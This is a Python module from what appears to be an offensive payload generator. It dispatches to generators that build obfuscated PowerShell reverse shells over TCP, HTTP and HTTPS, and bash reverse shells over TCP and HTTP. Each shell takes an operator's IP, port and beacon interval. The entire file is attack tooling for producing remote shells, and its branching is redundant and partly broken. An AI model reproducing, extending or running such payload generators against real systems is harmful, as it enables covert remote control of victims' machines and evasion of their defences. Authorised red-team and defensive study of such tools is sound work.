import base64
import random
import string
import pyperclip
import re
from core.payload_generator.common import payload_utils as payutils
from core.payload_generator.windows.tcp import powershell_reverse_tcp
from core.payload_generator.windows.http import powershell_reverse_http
from core.payload_generator.windows.https import powershell_reverse_https
from core.payload_generator.linux.tcp import bash_reverse_tcp
from core.payload_generator.linux.http import bash_reverse_http
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"



def generate_payload_windows(ip, port, obs, use_ssl, format_type, payload_type, beacon_interval, no_child=None):
    if payload_type == "tcp":
        raw = powershell_reverse_tcp.generate_powershell_reverse_tcp(ip, port, obs, use_ssl, no_child)

    elif payload_type == "http":
        raw = powershell_reverse_http.generate_windows_powershell_http(ip, port, obs, beacon_interval, no_child)

    elif payload_type == "https":
        raw = powershell_reverse_https.generate_windows_powershell_https(ip, port, obs, beacon_interval, no_child)

    if raw:
        return raw

    elif not raw:
        return False

    else:
        return False



def generate_payload_linux(ip, port, obs, use_ssl, format_type, payload_type, beacon_interval):
    if payload_type == "tcp":
        raw = bash_reverse_tcp.generate_bash_reverse_tcp(ip, port, obs, use_ssl)

    elif payload_type == "http":
        raw = bash_reverse_http.generate_bash_reverse_http(ip, port, obs, beacon_interval)

    if raw:
        return raw

    elif not raw:
        return False

    else:
        return False